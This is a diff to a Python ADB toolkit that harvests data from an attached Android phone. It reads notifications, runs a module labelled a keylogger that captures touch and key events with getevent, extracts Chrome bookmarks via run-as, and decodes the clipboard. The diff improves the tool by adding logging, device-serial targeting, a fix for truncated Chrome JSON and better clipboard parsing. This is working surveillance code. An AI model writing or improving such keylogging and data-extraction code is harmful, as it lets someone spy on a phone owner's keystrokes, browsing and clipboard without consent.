@@ -7,10 +7,13 @@ import subprocess
 import time
 import re
 import os
+import logging  # fix: module logger for except-site diagnostics (item 4)
 from pathlib import Path
 from adb_engine import ADBEngine
 
 adb = ADBEngine()
+
+log = logging.getLogger(__name__)  # fix: item 4
 
 
 def _decode_out(data):
@@ -94,20 +97,27 @@ def get_notifications():
                 "truncated": truncated}
 
     except Exception as e:
+        # fix: bare pass → log full traceback (item 4)
+        log.exception("get_notifications failed: %s", e)
         return {"success": False, "error": "Erreur lors de la lecture des notifications"}
 
 
 # ==================== MODULE 6: KEYLOGGER / TOUCH EVENT CAPTURE ====================
 
-def capture_events(duration=5):
+def capture_events(duration=5, serial=None):
     """Capture input events (touch/key) from the device for a given duration."""
     try:
         duration = min(max(int(duration), 2), 30)  # Clamp 2-30s
 
         # getevent -lt gives labeled timestamps + event names
         try:
+            # fix: optional serial targeting for multi-device hosts (item 1)
+            argv = [adb.adb_path]
+            if serial:
+                argv += ["-s", serial]
+            argv += ["shell", "getevent", "-lt"]
             res = subprocess.run(
-                [adb.adb_path, "shell", "getevent", "-lt"],
+                argv,
                 stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE,
                 text=True,
@@ -154,16 +164,23 @@ def capture_events(duration=5):
         }
 
     except Exception as e:
+        # fix: bare pass → log full traceback (item 4)
+        log.exception("capture_events failed: %s", e)
         return {"success": False, "error": "Erreur lors de la capture des événements"}
 
 
-def stream_events_raw(duration=5):
+def stream_events_raw(duration=5, serial=None):
     """Get raw getevent output as string for SSE streaming."""
     try:
         duration = min(max(int(duration), 2), 30)
         try:
+            # fix: optional serial targeting for multi-device hosts (item 1)
+            argv = [adb.adb_path]
+            if serial:
+                argv += ["-s", serial]
+            argv += ["shell", "getevent", "-lt"]
             res = subprocess.run(
-                [adb.adb_path, "shell", "getevent", "-lt"],
+                argv,
                 stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE,
                 text=True,
@@ -176,6 +193,8 @@ def stream_events_raw(duration=5):
             output = _decode_out(e.stdout)
         return {"success": True, "output": output[:10000]}
     except Exception as e:
+        # fix: bare pass → log full traceback (item 4)
+        log.exception("stream_events_raw failed: %s", e)
         return {"success": False, "error": "Erreur lors du flux d'événements"}
 
 
@@ -226,8 +245,10 @@ def get_browser_history():
 
         # Method 2: Try Chrome via run-as (needs debuggable or root)
         if not results["history"]:
+            # fix: no `| head -200` — truncating the JSON mid-structure broke
+            # json.loads every time; full file is fetched, entries capped in _extract_bm (item 2)
             chrome_res = adb.shell(
-                'run-as com.android.chrome cat app_chrome/Default/Bookmarks 2>/dev/null | head -200',
+                'run-as com.android.chrome cat app_chrome/Default/Bookmarks 2>/dev/null',
                 timeout=8
             )
             if chrome_res["success"] and chrome_res["stdout"] and len(chrome_res["stdout"]) > 10:
@@ -279,6 +300,8 @@ def get_browser_history():
         return results
 
     except Exception as e:
+        # fix: bare pass → log full traceback (item 4)
+        log.exception("get_browser_history failed: %s", e)
         return {"success": False, "error": "Erreur lors de l'extraction de l'historique"}
 
 
@@ -297,12 +320,16 @@ def get_clipboard():
             # Format: Result: Parcel(
             #   0x00000000: 00000000 00000003 0068006f 006c0061 '........h.o.l.a.'
             # )
-            hex_chunks = re.findall(r"([0-9a-fA-F]{8})\s+([0-9a-fA-F]{8})\s+([0-9a-fA-F]{8})\s+([0-9a-fA-F]{8})", raw)
+            # fix: capture anchored to 0x-prefixed parcel rows only (item 3) —
+            # hex tokens after the colon, ASCII gutter excluded
+            hex_chunks = []
+            for row_m in re.finditer(r"^\s*0x[0-9a-fA-F]+:\s*(.+)$", raw, re.MULTILINE):
+                hex_chunks.extend(re.findall(r"\b[0-9a-fA-F]{8}\b", row_m.group(1).split("'")[0]))
 
             if hex_chunks:
                 all_hex = ""
                 for chunk in hex_chunks:
-                    all_hex += "".join(chunk)
+                    all_hex += chunk
 
                 # Skip first 8 bytes (status + length), decode rest as UTF-16LE
                 try:
@@ -335,4 +362,6 @@ def get_clipboard():
             return {"success": True, "content": "", "length": 0, "note": "Presse-papier vide"}
 
     except Exception as e:
+        # fix: bare pass → log full traceback (item 4)
+        log.exception("get_clipboard failed: %s", e)
         return {"success": False, "error": "Erreur lors de la lecture du presse-papier"}
